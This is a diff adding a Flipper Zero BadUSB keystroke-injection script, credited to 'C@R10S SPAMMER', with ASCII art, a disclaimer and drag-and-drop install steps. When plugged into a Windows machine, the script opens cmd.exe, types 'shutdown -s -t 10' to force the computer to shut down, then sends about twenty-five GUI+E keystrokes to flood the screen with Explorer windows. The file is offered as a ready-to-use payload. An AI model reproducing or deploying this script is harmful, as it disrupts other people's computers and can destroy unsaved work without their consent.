@@ -1,0 +1,73 @@
+REM AUTHOR: C@R10S SPAMMER
+
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@%+*@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@+-----:::-@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@+-+@@@@@*--%@@@@@@@@@@@@@@
+REM @@*-::=%@@@@@#-=@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @+::::::+**+--+********************=:=#@@
+REM @=-:::::=*******+=:=***************=:-*@@
+REM @@*-::-%@@@@@@@@@@@--%@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@%--@@@@@----#@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@#-::::::::#@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@====%@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+REM -----------------------------------------------------------------------------------------------------------/
+REM CARLOS'S SPAM BOMMER + WINDOWS SHUTDOWN FLIPPER ZERO!
+REM -----------------------------------------------------------------------------------------------------------/
+REM INFORMATION: this document doesn't need editing I've tested and ran this document a few times.
+REM              just plug and play, most importantly have fun! also, I'm not responsible for any
+REM              damages done to anyone's computer, so take responsibility to your own actions!
+REM -----------------------------------------------------------------------------------------------------------/
+REM HOW TO DOWNLOAD AND INSTALL?:
+REM                              download this raw file.txt. Then open your flipper zero app. plug in your
+REM                              flipper. Click on file manager, SD Card and locate "Badusb" or "Badkb"
+REM                              Click on one of these and simply drag and drop into the app. you may then,
+REM                              Disconnect your flipper zero or keep connected to test. 
+REM -----------------------------------------------------------------------------------------------------------/ 
+
+DELAY 500
+GUI r
+STRING cmd.exe
+ENTER
+DELAY 2000
+STRING shutdown -s -t 10
+ENTER 
+DELAY 2000
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+GUI e
+
